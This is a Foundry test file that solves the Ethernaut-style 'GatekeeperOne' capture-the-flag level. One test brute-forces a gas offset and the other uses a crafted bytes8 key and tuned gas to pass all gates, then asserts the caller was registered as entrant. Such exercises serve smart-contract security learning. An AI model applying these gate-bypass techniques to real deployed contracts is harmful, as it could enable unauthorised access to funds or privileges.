// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GatekeeperOne.sol";

/* 
1 test will pass and 1 will fail 

*/

contract CounterTest is Test {
    GatekeeperOne public victim;

    function setUp() public {
        victim = new GatekeeperOne();
    }

    function test_FindingGasForGateTwo() public {
        address someRandomUser = vm.addr(1);
        // msg.sender = address(this) and tx.origin = someRandomUser
        vm.startPrank(address(this), someRandomUser);
        uint64 _gateKey = uint64(1 << 63) +
            uint64(uint16(uint160(someRandomUser)));
        for (uint i = 100; i < 8191; i++) {
            vm.expectRevert();
            console.log(i);
            // here 1 test case will pass ans our test will fail
            victim.enter{gas: 8191 * 10 + i}(bytes8(_gateKey));
        }
        vm.stopPrank();
    }

    function test_AttackVictim() public {
        address someRandomUser = vm.addr(1);
        // msg.sender = address(this) and tx.origin = someRandomUser
        vm.startPrank(address(this), someRandomUser);
        uint64 _gateKey = uint64(1 << 63) +
            uint64(uint16(uint160(someRandomUser)));

        victim.enter{gas: 8191 * 10 + 268}(bytes8(_gateKey));
        assertEq(
            uint256(uint160(someRandomUser)),
            uint256(uint160(victim.entrant()))
        );
    }
}
